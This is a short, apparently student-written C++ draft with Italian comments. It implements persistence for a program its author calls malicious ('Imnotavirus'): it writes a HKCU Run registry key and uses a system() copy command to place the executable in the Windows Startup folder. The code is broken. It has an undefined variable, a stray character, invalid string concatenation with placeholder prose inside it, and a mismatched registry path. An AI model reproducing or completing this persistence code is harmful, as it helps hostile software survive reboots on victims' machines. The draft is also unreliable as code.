//bozza creata guardando le docs di microsoft non so se funziona da testate
//https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa
//in piu creare anche un funzione che copia il path del programma malevolo nella startup di windows
//da rivedere
//https://cpp.hotexamples.com/it/examples/-/-/RegOpenKeyEx/cpp-regopenkeyex-function-examples.html

void registery(void)
{
    HKEY hKey;
    const char *StartNameExe = "Exe_Name";
    string ExePath = "%USERPROFILE%\\Start Menu\\Programs\\Startup\\" + Exe_Name;

    LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER,
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0, KEY_WRITE,
                                &hKey);
    if (ERROR_SUCCESS == lResult)
    {
        lResult = RegSetValueEx(hKey,
                                StartNameExe,
                                0,
                                REG_SZ,
                                (unsigned char *)ExePath.c_str(),
                                strlen(ExePath.c_str()));
    }

    RegCloseKey(hKey);
}

void startup(void) /
{
    string addStartUp = ("copy \"" + "locazione del file exe malevolo potrei prelevarla tramite getlocation e passargli il parametro location
                                     "+"\\"+" Nome del file exe in questo caso Imnotavirus "+"\" \"%USERPROFILE%\\Start Menu\\Programs\\Startup\"");
    system(addStartUp.c_str());
}

//aggiungere le chimate al main e testare
// post esame provo